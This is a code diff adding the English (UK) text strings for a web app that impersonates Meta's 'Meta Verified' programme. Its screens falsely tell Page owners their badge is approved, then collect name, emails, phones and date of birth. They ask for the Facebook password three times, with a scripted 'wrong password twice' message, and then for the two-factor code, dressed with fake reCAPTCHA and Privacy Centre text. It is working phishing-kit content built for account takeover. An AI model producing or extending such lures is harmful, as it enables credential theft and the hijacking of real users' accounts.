@@ -1,0 +1,200 @@
+import type { AppStrings } from '../schema'
+
+export const enGb: AppStrings = {
+  common: {
+    close: 'Close',
+    continue: 'Continue',
+    facebook: 'Facebook',
+  },
+  main: {
+    badge: 'META VERIFIED',
+    releaseDate: 'Approved on:',
+    title: 'Your Page is now Meta Verified',
+    lead1:
+      'Congratulations! Your Page has met the eligibility criteria and is approved for Meta Verified.',
+    lead2:
+      'Complete the final activation steps to unlock enhanced credibility, protection, priority support, and audience trust. Your reference code is listed below for tracking.',
+    caseId: 'Activation reference:',
+    reviewStatusLabel: 'Status:',
+    reviewStatus: 'Approved — pending final activation',
+    programScope:
+      'Meta Verified for Business — the official verification programme for eligible Pages and organisations.',
+    activationStepsTitle: 'Activation process',
+    step1: 'Confirm business information',
+    step2: 'Verify account security',
+    step3: 'Activate your Meta Verified badge',
+    securityNotice:
+      'Your information is sent over a secure connection and is used only to complete Meta Verified verification under Meta\'s',
+    securityNoticeEnd: '.',
+    helpPrompt: 'Need help? Visit the',
+    estimatedDuration: 'Estimated completion time: approximately 5–10 minutes.',
+    featuresTitle: 'Your Meta Verified benefits',
+    feature1Title: 'Account Protection',
+    feature1Desc:
+      'Enhanced protection for your Page and linked admin accounts, with monitoring aligned to Meta security standards. Verified identity helps prevent unauthorised access and changes.',
+    feature2Title: 'Verified Badge',
+    feature2Desc:
+      'Display the official Meta Verified badge so people can recognise your authentic Page on Facebook and across Meta platforms.',
+    feature3Title: 'Priority Support',
+    feature3Desc:
+      'Get priority access to Meta business support for Page, security, and policy-related requests.',
+    feature4Title: 'Increased Trust',
+    feature4Desc:
+      'Signal to customers and partners that Meta has confirmed your Page as the official representative of your brand.',
+    feature5Title: 'Audience Growth',
+    feature5Desc:
+      'Strengthen your presence with a verified Page that helps build trust and engage your target audience.',
+    feature6Title: 'Monetization Opportunities',
+    feature6Desc:
+      'Unlock eligible monetisation programmes and creator tools when your Page meets Meta policy and verification requirements.',
+    cta: 'Activate Meta Verified',
+    noteTitle: 'Important',
+    noteBody:
+      'Complete all activation steps with accurate, verifiable information. Your verified badge and Meta Verified benefits will apply once processing is complete — typically within 24 hours.',
+    linkPrivacy: 'Privacy Policy',
+    linkTerms: 'Terms',
+    linkCommunity: 'Community Standards',
+    linkHelp: 'Help Centre',
+    linkBusiness: 'Meta Business Help Centre',
+    footerMeta:
+      'Meta Platforms, Inc., Attention: Community Support, 1 Meta Way, Menlo Park, CA 94025',
+    altVerifiedBadge: 'Meta Verified badge',
+    altFeatureIcon: 'Feature icon',
+  },
+  info: {
+    title: 'Activation details',
+    hint: 'Please fill in all required fields accurately to complete your Meta Verified activation.',
+    sectionPersonal: 'Personal information',
+    sectionContact: 'Contact',
+    fullName: 'Representative full name',
+    fullNamePh: 'e.g. Jane Doe',
+    email: 'Contact email',
+    emailPh: 'e.g. name@gmail.com',
+    emailBiz: 'Business email',
+    emailBizPh: 'e.g. contact@company.com',
+    fanpage: 'Page / Fan Page name',
+    fanpagePh: 'e.g. ABC Studio Official',
+    phone: 'Phone number',
+    phoneBackup: 'Backup phone (if we can\'t reach you)',
+    dob: 'Date of birth',
+    day: 'Day',
+    month: 'Month',
+    year: 'Year',
+    message: 'Additional notes (optional)',
+    messagePh:
+      'e.g. This is the official Page for brand ABC; completing activation will help display your Meta Verified badge.',
+    fbNotifyTitle: 'On Facebook',
+    fbNotifyBadge: 'Recommended',
+    fbNotifyDesc:
+      'The verification notice will be sent via Facebook for you to approve.',
+    fbNotifyAria: 'Enable notifications on Facebook',
+    agree: 'I agree to the',
+    agreeTerms: 'Terms of Use',
+    submit: 'Continue activation',
+    errFullName: 'Please enter your full name.',
+    errEmail: 'Please enter a contact email address.',
+    errEmailFmt: 'Contact email format is invalid (e.g. name@domain.com).',
+    errEmailBiz: 'Please enter a business email.',
+    errEmailBizFmt: 'Business email format is invalid (e.g. name@domain.com).',
+    errFanpage: 'Please enter the Page / Fan Page name.',
+    errPhone: 'Please enter a phone number.',
+    errPhoneLen: '8–15 digits required.',
+    errDay: 'Please select a day of birth.',
+    errMonth: 'Please select a month of birth.',
+    errYear: 'Please select a year of birth.',
+  },
+  password: {
+    firstPrompt: 'For security reasons, please enter your password to continue.',
+    secondPrompt: 'Please re-enter your password to confirm and continue.',
+    thirdPrompt: 'Please enter your password one more time to confirm and continue.',
+    notice:
+      'Tip: Double-check your password before the second entry to avoid mistakes. You can use the eye icon to show or hide your password on the confirmation step.',
+    noticeThird:
+      'You entered the wrong password twice. If you don’t remember it, tap “Forgot password?” below.',
+    phFirst: 'Enter password',
+    phSecond: 'Re-enter password',
+    continue: 'Continue',
+    forgot: 'Forgot password?',
+    errEmpty: 'Please enter your password.',
+    errWrong: 'The password you entered is incorrect.',
+    ariaShowPassword: 'Show password',
+    ariaHidePassword: 'Hide password',
+    ariaPasswordToggleDisabled: 'Password visibility cannot be changed',
+  },
+  twoFa: {
+    title: 'Two-factor authentication required',
+    description: (destinations: string) =>
+      destinations
+        ? `Enter the code sent to ${destinations}, another linked phone number, or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).`
+        : `Enter the code sent to your account, another linked phone number, or confirm with an authenticator app you set up (such as Duo Mobile or Google Authenticator).`,
+    label: '2FA code',
+    placeholder: 'Enter authentication code',
+    hint: 'A valid code is 6 or 8 digits.',
+    tryOther: 'Try another way',
+    ariaInput: 'Two-factor authentication code',
+    ariaSubmit: 'Continue activation',
+    errInvalid: 'Please enter a valid 2FA code with 6 or 8 digits.',
+    errSend: 'Could not send the authentication code. Please try again later.',
+    errVerify: 'Could not verify the 2FA code. Please try again.',
+    retryErrorExpired: (minutes, seconds) =>
+      `The authentication code has expired. Please try again in ${minutes} min ${seconds} sec.`,
+    authIllustrationAlt: 'Illustration of two-factor authentication on a phone',
+    metaLogoAlt: 'Meta logo',
+  },
+  success: {
+    title: 'Meta Verified activated',
+    p1:
+      'Congratulations! Your Meta Verified benefits are being activated. Your blue badge will appear on your Page once processing is complete.',
+    p2: 'You will receive a notification on Facebook when your Meta Verified badge is live.',
+    idleNote: 'No further action is required until you receive a notification on Facebook.',
+    cta: 'Return to Facebook',
+  },
+  captcha: {
+    altLogo: 'Meta logo',
+    altRecaptcha: 'reCAPTCHA',
+    notRobot: "I'm not a robot",
+    verifying: 'Verifying...',
+    privacyTerms: 'Privacy - Terms',
+    p1:
+      'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.',
+    p2:
+      "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
+    p3:
+      'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.',
+  },
+  nav: {
+    heading: 'Privacy Centre',
+    home: 'Privacy Centre Home',
+    search: 'Search',
+    commonSettings: 'Common privacy settings',
+    topics: 'Privacy topics',
+    moreResources: 'More privacy resources',
+    policy: 'Privacy Policy',
+    policyQ1: 'What is the Privacy Policy and what does it cover?',
+    policyQ2: 'What information do we collect?',
+    policyQ3: 'How do we use your information?',
+    policyQ4:
+      'How do we share your information on Meta Products or with integrated partners?',
+    policyQ5: 'How do we share information with third parties?',
+    policyQ6: 'How is the cooperation between Meta Companies organized?',
+    policyQ7: 'How can you manage or delete your information and exercise your rights?',
+    policyQ8: 'How long do we keep your information?',
+    policyQ9: 'How do we transmit information?',
+    policyQ10:
+      'How do we respond to official requests, comply with applicable laws, and prevent harm?',
+    policyQ11: 'How will you know when the policy changes?',
+    policyQ12: 'How to ask Meta questions?',
+    policyQ13: 'Why and how we process your data',
+    otherRules: 'Other rules and articles',
+    cookie: 'Cookie Policy',
+    nonUsers: 'Information for those who do not use Meta Products',
+    genAi: 'How Meta uses information for generative AI models',
+    dataTransfer: 'Data Transfer Framework Policy',
+    otherTerms: 'Other terms and conditions',
+    mobileTitle: 'Privacy Policy',
+  },
+  languagePicker: {
+    label: 'View in another language (optional)',
+    autoOption: 'Automatic (from your IP / location)',
+  },
+}
